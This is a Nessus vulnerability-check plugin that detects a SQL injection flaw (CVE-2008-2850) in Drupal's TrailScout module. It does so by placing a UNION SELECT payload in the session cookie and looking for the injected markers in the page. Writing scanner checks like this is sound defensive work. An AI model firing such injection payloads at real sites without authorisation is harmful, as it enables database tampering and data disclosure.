#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33274);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-2850");
  script_bugtraq_id(29807);
  script_xref(name:"OSVDB", value:"46431");

  script_name(english:"TrailScout Module For Drupal Session Cookie SQL Injection");
  script_summary(english:"Tries to inject SQL statements into session cookie");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running TrailScout, a third-party module for Drupal
that displays a breadcrumb-like trail showing pages a user recently
visited on a site. 

The version of the TrailScout module installed on the remote host
fails to sanitize user supplied input to the session cookie before
using it in database queries.  Regardless of PHP's 'magic_quotes_gpc'
setting, an attacker may be able to exploit this issue to manipulate
database queries, leading to disclosure of sensitive information,
modification of data, or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://drupal.org/node/272191" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to TrailScout version 5.x-1.4." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");
  script_dependencies("drupal_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Check if Drupal is installed.

install = get_kb_item(string("www/", port, "/drupal"));

if (isnull(install)) exit(0);

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  if (dir != "/") dir = string(dir,"/");
  clear_cookiejar();
  res = http_get_cache(item:dir, port:port, cookies: 1);
  if (isnull(res)) exit(0);

 # If we see the cookie ...
 if ("Set-Cookie:" >< res)
 {
  # Use the cookie name and exploit the cookie value.
  magic1 = unixtime(); 
  magic2 = rand();
  exploit = string("foo' UNION SELECT ",magic1,',',magic2," #");

  replace_http_cookies(new_value: exploit);

  r = http_send_recv3(method: 'GET', item:dir, port:port);
  if (isnull(r)) exit(0); 
  
    # There is a problem if we see magic 

  if (string('<a href="/',magic1,'" title="',magic2 ) >< r[2]) 
    {
       security_hole(port);
       set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
       exit(0);
    }
  }
}

